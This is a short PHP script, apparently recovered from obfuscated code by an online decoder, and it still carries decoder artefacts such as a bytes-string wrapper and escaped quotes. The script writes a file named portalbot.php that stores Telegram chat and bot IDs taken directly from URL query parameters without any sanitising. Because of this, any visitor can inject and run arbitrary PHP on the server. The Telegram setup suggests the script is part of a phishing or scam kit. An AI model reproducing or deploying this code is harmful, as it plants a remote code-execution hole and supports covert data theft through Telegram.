/* Decoded by unphp.net */

?>b'<?php
$pertama = "<?php 
";
$terakhir = "?>";
$put = fopen("portalbot.php","w") or die("Cannot write to path");
		 fwrite($put,$pertama);
		 fwrite($put,\'$id_telegram = "\'.$_GET[\'id_telegram\'].\'";\');
		 fwrite($put,"
");
		 fwrite($put,\'$id_botTele = "\'.$_GET[\'id_botTele\'].\'";\');
         fwrite($put,"
");
         fwrite($put,\'$waktu = "\'.$_GET[\'waktu\'].\'";\');
		 fwrite($put,"
");
		 fwrite($put,$terakhir);
		 fclose($put);
echo \'200\';'